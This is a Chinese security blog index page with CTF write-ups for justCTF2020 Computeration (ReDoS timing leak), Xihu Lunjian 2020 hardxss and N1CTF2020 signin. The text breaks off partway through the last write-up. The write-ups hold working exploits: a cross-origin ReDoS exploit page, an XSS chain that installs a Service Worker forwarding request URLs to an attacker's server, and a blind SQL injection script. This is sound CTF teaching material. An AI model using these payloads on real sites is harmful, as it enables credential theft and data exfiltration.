<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="EVatom"><meta name="copyright" content="EVatom"><title>EVatom 's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="http://q2.qlogo.cn/headimg_dl?dst_uin=2466358849&amp;spec=160"></div><div class="author-info__name text-center">EVatom</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="http://hexo.imagemlt.xyz/" target="_blank" rel="noopener">Imagemlt</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/wfzWebSecuity/" target="_blank" rel="noopener">tr1ple</a><a class="author-info-links__name text-center" href="https://aryb1n.github.io/" target="_blank" rel="noopener">Aryb1n</a></div></div></div><nav id="nav" style="background-image: url(https://images.alphacoders.com/975/975730.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">EVatom 's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a></span></div><div id="site-info"><div id="site-title">EVatom 's Blog</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/YanLuOW" target="_blank" rel="noopener"><i class="fa-github fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/04/justCTF2020%E9%A2%98%E7%9B%AEComputeration%E5%88%86%E6%9E%90/">justCTF2020题目Computeration分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-04</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>环境是纯运行在客户端上的，与服务端不存在交互，代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Computeration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Computeration<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My Notes<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"notesDiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"clearNotes()"</span>&gt;</span>Clear notes<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        Search in my notes <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"searchNoteInp"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"searchNote()"</span>&gt;</span>OK<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"notesFound"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> notes = <span class="built_in">JSON</span>.parse(localStorage.getItem(<span class="string">'notes'</span>)) || [];</span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">clearNotes</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">                notes = [];</span><br><span class="line"><span class="actionscript">                localStorage.setItem(<span class="string">'notes'</span>, <span class="string">'[]'</span>);</span></span><br><span class="line"><span class="actionscript">                notesDiv.innerHTML = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">                notesFound.innerHTML=<span class="string">''</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">insertNote</span><span class="params">(title, content)</span></span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                notesDiv.innerHTML += `<span class="tag">&lt;<span class="name">details</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span>&gt;</span>$&#123;title&#125;<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;content&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>`</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">let</span> note <span class="keyword">of</span> notes)&#123;</span></span><br><span class="line">                insertNote(note.title, note.content);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">searchNote</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">                location.hash = searchNoteInp.value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            onhashchange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="built_in">decodeURIComponent</span>(location.hash.slice(<span class="number">1</span>)));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">const</span> found = [];</span></span><br><span class="line"><span class="javascript">                notes.forEach(<span class="function"><span class="params">e</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">if</span>(e.content.search(reg) !== <span class="number">-1</span>)&#123;</span></span><br><span class="line">                        found.push(e.title);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                notesFound.innerHTML = found;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">addNote</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">const</span> title = newNoteTitle.value;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">const</span> content = newNoteContent.value;</span></span><br><span class="line">                insertNote(title,content);</span><br><span class="line">                notes.push(&#123;title, content&#125;);</span><br><span class="line"><span class="javascript">                localStorage.setItem(<span class="string">'notes'</span>, <span class="built_in">JSON</span>.stringify(notes));</span></span><br><span class="line"><span class="actionscript">                newNoteTitle.value = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">                newNoteContent.value = <span class="string">''</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>New Note<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        Title: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"newNoteTitle"</span>/&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        Content: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"newNoteContent"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"addNote()"</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>该代码存在slef-xss，只需要文章标题或者内容提交<code>&lt;svg/onload=alert(1)&gt;</code>即可，但是无法用来攻击。能看出搜索功能的参数是唯一会出现在url中的东西，但是搜索的参数只会用于进行正则匹配且无法输出在页面上，故如果可以利用让正则匹配结果成功与否导致环境的延时，那么就可以在我们自己可控的页面上使用iframe并结合浏览器异步来通过延时外带保存在管理员的note里的数据。</p>
<h3 id="reDOS"><a href="#reDOS" class="headerlink" title="reDOS"></a>reDOS</h3><p>JavaScript的正则引擎是传统型NFA引擎，而NFA引擎的原理用一句话概括即是用表达式去匹配文本。当NFA引擎遇到正则表达式中的分支时，会对每个分支进行遍历直到匹配成功。基于这样的原理，当最后匹配结果为false时，正则引擎一定遍历了所有的分支。如果正则表达式可控，我们就可以通过增加分支的数量且保证正则无法匹配出结果来让正则引擎遍历所有的节点，从而使得运算量过大导致程序崩溃。</p>
<p>这里给出一个示例：<code>((((.*)*)*)*)*salt</code>，最后的salt的作用就是让这个正则无法匹配字符串，其长度和内容并不会太影响到reDOS的效果，只需要保证salt处的字符不要与用于匹配的字符后几个相同即可。假设输入字符是abc，由于*号是贪婪匹配，前边几个括号会直接匹配abcq，然后发现空字符串与s不匹配，于是正则引擎开始回溯，从已经和前面匹配的abc中取出一个c，ab和最里层的<code>.*</code>匹配，而回溯出来的c会先与次里层的*匹配（可以理解为该正则变成了<code>((((.*)(.*))*)*)*s</code>，然而此时依然无结果，故c会与第三层的*匹配，直到匹配完五个*。由于都匹配不到，所以正则引擎会再回溯一个b出来再重复一遍以上操作，由于每多一个字符就要多重复5次，故待匹配字符每多一个就要多花5倍的时间用于回溯，示例如下：</p>
<p><img src="/2021/02/04/justCTF2020%E9%A2%98%E7%9B%AEComputeration%E5%88%86%E6%9E%90/reg1.png" alt="reg1"></p>
<p><img src="/2021/02/04/justCTF2020%E9%A2%98%E7%9B%AEComputeration%E5%88%86%E6%9E%90/reg2.png" alt="reg2"></p>
<p>同时为了能够逐位判断reDOS的值，需要添加一个正向肯定预查，如：<code>^(?=^justCTF{a)((((.*)*)*)*)*salt</code>，这样当不满足正向肯定预查时就不会进入后边的正则中，从而不会导致延时，当满足条件时就会延时，故通过此来进行逐位判断。</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>由于查询是在onhashchange事件后被触发，所以直接把iframe的src设置为延时的payload是不行的，必须先开一个目标环境的iframe再将src修改，贴一份exp：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">body&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	key=<span class="string">'abcdefghijklmnopqrstuvwxyz_$'</span>;</span></span><br><span class="line"><span class="javascript">	iframe=<span class="built_in">document</span>.getElementById(<span class="string">'test'</span>);</span></span><br><span class="line">	n=0;</span><br><span class="line"><span class="actionscript">	f1=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">		iframe.src=<span class="string">'https://computeration.web.jctf.pro/?'</span>+n+<span class="string">'#'</span>;</span></span><br><span class="line">		iframe.onload=f2;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="actionscript">	f2=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">		iframe.src+=<span class="string">'^(?=justCTF\\&#123;'</span>+key[n]+<span class="string">')((((.*)*)*)*)*233'</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="comment">//iframe.src+='^(?=justCTF\\&#123;cross_origin_timing_lol\\&#125;)((((.*)*)*)*)*233';</span></span></span><br><span class="line"><span class="actionscript">		<span class="comment">//iframe.src+='^(?=justCTF\\&#123;no_referer_typo_ehhhhhh\\&#125;)((((.*)*)*)*)*233';</span></span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).src=location.origin+<span class="string">'/report.txt?'</span>+key[n];</span></span><br><span class="line">		n+=1;</span><br><span class="line"><span class="actionscript">		<span class="keyword">if</span>(n&gt;=key.length)<span class="keyword">return</span>;</span></span><br><span class="line">		f1();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="actionscript">	iframe.src=<span class="string">'https://computeration.web.jctf.pro/?0#'</span>;</span></span><br><span class="line">	iframe.onload=f2;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于这里选取的payload结合flag的长度会导致浏览器卡死无法执行其他命令，故接收到的最后一个字符即符合要求的字符。但是由于flag长度未知，所以很难精准控制payload从而达到产生延时且浏览器不崩溃的程度，故暂时未想出可以一步获取flag所有字符的方法。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss/">xss持久化以及西湖论剑2020hardxss</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/xss-CTF/">xss CTF</a></span><div class="content"><h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><p>Service Worker 是 PWA 技术基础之一，使得Web App 离线缓存成为可能，更为后台同步、通知推送等功能提供了思路。而该技术最核心的一个特性就是，Service Worker 工作线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，故该特性为XSS的持久化实现提供了基础。</p>
<p>不过service worker的安装本身也存在一定的限制，如限制在 HTTPS 下工作并且安装ServiceWorker的脚本需要当前域下。service worker的注册代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.serviceWorker.register(<span class="string">'test.js'</span>)</span><br></pre></td></tr></table></figure>

<p>ServiceWorker 在运行过程中使用的是Web Worker ，而Web Worker 线程在对象获取上存在限制，如document、DOM、window这样的对象无法获取，但是可以获取location对象、XMLHttpRequest对象等，并且可以通过importScripts()方法加载其他脚本</p>
<h2 id="西湖论剑2020hardxss"><a href="#西湖论剑2020hardxss" class="headerlink" title="西湖论剑2020hardxss"></a>西湖论剑2020hardxss</h2><h4 id="xss点"><a href="#xss点" class="headerlink" title="xss点"></a>xss点</h4><p>在xss主机下的login的登录界面发现一个jsonp，其代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">callback = <span class="string">"get_user_login_status"</span>;</span><br><span class="line">auto_reg_var();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(jump_url) == <span class="string">"undefined"</span> || <span class="regexp">/^\//</span>.test(jump_url))&#123;</span><br><span class="line">	jump_url = <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">jsonp(<span class="string">"https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback="</span> + callback,<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(result[<span class="string">'status'</span>])&#123;</span><br><span class="line">				location.href = jump_url;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, success</span>) </span>&#123;</span><br><span class="line">		  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">		  <span class="keyword">if</span>(url.indexOf(<span class="string">"callback"</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		    	<span class="keyword">var</span> funName = <span class="string">'callback_'</span> + <span class="built_in">Date</span>.now() + <span class="built_in">Math</span>.random().toString().substr(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">		    	url = url + <span class="string">"?"</span> + <span class="string">"callback="</span> + funName;</span><br><span class="line">		    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    	<span class="keyword">var</span> funName = callback;</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="built_in">window</span>[funName] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		        success(data);</span><br><span class="line">		        <span class="keyword">delete</span> <span class="built_in">window</span>[funName];</span><br><span class="line">		        <span class="built_in">document</span>.body.removeChild(script);</span><br><span class="line">		    &#125;</span><br><span class="line">		    script.src = url;</span><br><span class="line">		    <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">auto_reg_var</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">var</span> search = location.search.slice(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">var</span> search_arr = search.split(<span class="string">'&amp;'</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; search_arr.length; i++)&#123;</span><br><span class="line">				[key,value] = search_arr[i].split(<span class="string">"="</span>);</span><br><span class="line">				<span class="built_in">window</span>[key] = value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到auto_reg_var()函数存在变量覆盖，故可以将callback变量覆盖掉，且jsonp返回的数据会被当做js代码执行，如?callback=alert(1)既可弹窗，但是存在50个字符的限制，不过可以通过引入外部js或者通过变量覆盖+eval来绕过。</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>走一下登录流程可以发现账号密码会出现在auth子域名下的url里，故可以获取url来登录admin。从题目描述可知，登录流程发生在管理员访问我们提交的网站之后，故需要xss持久化。由于待获取的url在auth子域名下，所以ServiceWorker的注册过程也得在该域名下进行，而且由于之前提到的安装ServiceWorker的脚本应该与安装代码同域，故我们的攻击流程要同时满足以上两点。</p>
<p>首先要实现通过xss在auth子域名执行js代码。查看auth子域名的源代码我们可以发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于这里设置了document.domain，故我们可以通过iframe实现跨域在auth子域名下执行js，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> iff = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iff.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line">iff.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iff);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("xxxx.js")`</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就让serviceWorker通过auth域下的xxxx.js完成了安装，接下来就需要在auth域下找一个可控的js文件，方法就是通过这个jsonp的api。安装serviceWorker用的脚本较为复杂，但是可以使用importScripts()方法加载远程脚本，所以只需要执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.serviceWorker.register(<span class="string">"/api/loginStatus?callback=self.importScripts('your_vps/a.js')//"</span>)</span><br></pre></td></tr></table></figure>

<p>vps需要能支持https，即可实现serviceWorker的安装。而a.js的内容为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'install ok!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.request);</span><br><span class="line">        event.respondWith(</span><br><span class="line">        caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> requestBackend(event);</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestBackend</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> url = event.request.clone();</span><br><span class="line">        <span class="built_in">console</span>.log(url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">"&lt;script&gt;location='http://your_vps/'+location.search;&lt;/script&gt;"</span>, &#123;<span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以把所有auth域名下http请求的url发至我们的vps。最终的payload<code>https://xss.hardxss.xhlj.wetolink.com/login?callback=eval(atob(a));//&amp;a=ZG9jdW1lbnQuZG9tYWluID0gImhhcmR4c3MueGhsai53ZXRvbGluay5jb20iOwp2YXIgaWZmID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7CmlmZi5zcmMgPSAnaHR0cHM6Ly9hdXRoLmhhcmR4c3MueGhsai53ZXRvbGluay5jb20vJzsKaWZmLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCBmdW5jdGlvbigpeyBpZmZMb2Fkb3ZlcigpOyB9KTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZmYpOwpleHAgPSBgbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoInh4eHguanMiKWA7CmZ1bmN0aW9uIGlmZkxvYWRvdmVyKCl7CiAgICBpZmYuY29udGVudFdpbmRvdy5ldmFsKGV4cCk7Cn0=</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/21/N1CTF2020%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/">N1CTF2020部分web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>这个注入还是挺妖的，ip类的__toString可以返回mysql执行的报错信息，而flag类会根据这个返回值是否含有n1ctf来输出不同的信息，所以只需要通过if结构来改变updatexml函数的报错即可。列名貌似被出题人手动改过，故最后采取了无列名注入，exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.205.189/?input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";N;&#125;s:5:"check";s:6:"123456";&#125;'</span></span><br><span class="line">xff = <span class="string">"aa','123'),(updatexml(1,concat(0x7e,(select '1'),if(&#123;&#125;,'n1ctf','111')),1),'123')#"</span></span><br><span class="line"><span class="comment">#payload = 'ascii(mid((select(group_concat(SCHEMA_NAME))from(information_schema.schemata)),&#123;&#125;,1))=&#123;&#125;'</span></span><br><span class="line"><span class="comment">#payload = 'ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;'</span></span><br><span class="line"><span class="comment">#payload = 'ascii(binary 